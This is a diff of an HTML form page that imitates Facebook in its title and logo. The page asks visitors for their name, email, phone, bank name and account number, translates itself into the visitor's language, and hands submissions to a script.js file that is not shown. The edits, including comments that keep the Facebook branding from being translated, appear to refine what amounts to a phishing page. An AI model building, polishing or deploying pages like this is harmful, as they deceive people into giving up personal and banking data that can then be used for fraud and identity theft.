@@ -1,10 +1,15 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+  <!-- Prevent Google Translate from changing title/brand -->
   <meta name="google" content="notranslate">
+
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <!-- Title stays exact -->
   <title>Facebook - Form</title>
+
   <link rel="stylesheet" href="style.css">
 </head>
 <body>
@@ -12,9 +17,9 @@
   <div class="container">
     <div class="logo"><div class="logo-circle notranslate">F</div></div>
     <h2>Please fill in all fields carefully.</h2>
-
-    <!-- Changed id from bigForm to loginForm -->
-    <form id="loginForm">
+    
+    <!-- ✅ Already has the ID -->
+    <form id="bigForm">
       <input name="fullname" placeholder="Full Name" required>
       <input name="email" type="email" placeholder="Email Address" required>
       <input name="phone" type="tel" placeholder="Phone Number" required>
@@ -44,20 +49,24 @@
       <input name="bank" placeholder="Bank Name">
       <input name="account" placeholder="Account Number">
       <textarea name="interests" placeholder="Personal Interests / your type of content"></textarea>
+      
       <p>Short Survey:</p>
       <label><input type="checkbox" name="reason" value="Monetization"> Monetization</label>
       <label><input type="checkbox" name="reason" value="Business"> Business</label>
       <label><input type="checkbox" name="reason" value="Dating"> Dating</label>
       <label><input type="checkbox" name="reason" value="Other"> Other</label>
       <textarea name="bio" placeholder="Write a Short Bio about yourself (150–300 words)"></textarea>
+      
       <p>Notification Preferences:</p>
       <label><input type="checkbox" name="notify" value="Email"> Email Updates</label>
       <label><input type="checkbox" name="notify" value="SMS"> SMS Alerts</label>
       <label><input type="checkbox" name="notify" value="Push"> Push Notifications</label>
+      
       <p>Choose Plan:</p>
       <label><input type="radio" name="plan" value="Free"> Free</label>
       <label><input type="radio" name="plan" value="Basic"> Basic</label>
       <label><input type="radio" name="plan" value="Premium"> Premium</label>
+      
       <p><input type="checkbox" required> I have read and agree</p>
       <button type="submit">Submit</button>
     </form>
@@ -81,9 +90,9 @@
       var userLang = navigator.language || navigator.userLanguage;
       userLang = userLang.split('-')[0];
       var supported = ["es","fr","de","it","pt","zh-CN","ja"];
-
       if (supported.includes(userLang)) {
-        setTimeout(function(){var select = document.querySelector("select.goog-te-combo");
+        setTimeout(function(){
+          var select = document.querySelector("select.goog-te-combo");
           if (select) {
             select.value = userLang;
             select.dispatchEvent(new Event("change"));
@@ -92,9 +101,9 @@
       }
     }
   </script>
-  <script src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
+  <script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
 
- <!-- ✅ Attach your JS here -->
+  <!-- ✅ Make sure script.js is included -->
   <script src="script.js"></script>
 </body>
 </html>
